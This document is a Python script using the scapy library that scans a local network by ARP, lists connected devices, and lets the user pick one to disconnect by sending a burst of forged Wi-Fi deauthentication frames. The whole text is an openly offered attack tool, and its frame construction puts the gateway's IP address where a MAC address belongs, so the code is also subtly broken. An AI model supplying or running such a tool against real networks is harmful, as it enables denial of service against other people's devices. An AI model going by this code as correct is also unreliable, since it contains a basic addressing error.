import os
import time

from scapy.all import *


def get_target_mac(network):
    """Scans for devices on the specified network and lists their MAC addresses."""
    print("[*] Scanning for devices on the network...")
    devices = []
    # Scan using an ARP request to identify devices on the network
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    for element in answered_list:
        devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})

    print(f"[+] Devices found: {len(devices)}")
    return devices

def deauth_target(target_mac, gateway_ip, interface="wlan0"):
    """Sends deauthentication packets to kick the target device off the network."""
    print(f"[*] Sending deauth packets to {target_mac}...")
    # Craft deauthentication packet
    packet = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_ip, addr3=gateway_ip)/Dot11Deauth()
    # Send packet continuously to disconnect the target
    sendp(packet, iface=interface, count=100, inter=0.1, verbose=False)
    print("[+] Deauth packets sent!")

def main():
    # Set your network (gateway IP and network range)
    gateway_ip = input("[*] Enter your gateway IP (e.g., 192.168.1.1): ")
    network = input("[*] Enter your network range (e.g., 192.168.1.0/24): ")
    interface = input("[*] Enter your wireless interface (e.g., wlan0mon): ")

    devices = get_target_mac(network)
    print("\n[*] List of connected devices:")
    for i, device in enumerate(devices):
        print(f"{i + 1}. IP: {device['ip']} | MAC: {device['mac']}")

    target_choice = int(input("\n[*] Enter the number of the device to kick: ")) - 1
    target_mac = devices[target_choice]['mac']

    # Kick the target device
    deauth_target(target_mac, gateway_ip, interface)

if __name__ == "__main__":
    main()
